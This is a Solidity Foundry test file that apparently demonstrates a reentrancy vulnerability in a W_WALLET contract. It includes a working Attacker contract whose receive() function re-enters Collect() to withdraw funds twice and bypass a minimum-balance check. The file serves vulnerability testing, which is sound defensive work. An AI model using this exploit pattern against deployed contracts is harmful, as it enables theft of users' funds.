
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 1 ether. We need at least 1 ether to pass the first check.
        // We limit max value to avoid overflow issues, though 0.8.29 handles them.
        vm.assume(attackVal >= 1 ether && attackVal <= 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific pre-state needed on the contract itself, handled in setupAttack.

        // --- 3. Funding ---
        // Fund the Victim (optional, but good practice)
        vm.deal(address(_contractUnderTest), attackVal); 
        
        // Fund the Test Contract so it can send ETH to the Attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // The contract requires block.timestamp > unlockTime.
        // Put() sets unlockTime to block.timestamp. We must warp forward.
        vm.warp(block.timestamp + 10);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawAmount;

    constructor(address victimAddress) { 
        victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds. Pass 0 as unlockTime so it defaults to block.timestamp.
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // We attempt to withdraw the deposited amount in two halves.
        // Normally, if we withdraw half, the balance decreases.
        // If the remaining balance < MinSum (1 ether), a second withdrawal should fail.
        // By re-entering, we bypass the MinSum check for the second withdrawal.
        
        storedWithdrawAmount = val / 2;
        initialSnapshot = address(this).balance;

        // Start the attack
        victim.Collect(storedWithdrawAmount);

        // Verify Success:
        // We expect to have received the withdraw amount twice.
        // Logic: Initial + (Amount * 2) <= Current Balance
        if (address(this).balance >= initialSnapshot + (storedWithdrawAmount * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            victim.Collect(storedWithdrawAmount);
        }
    }
}
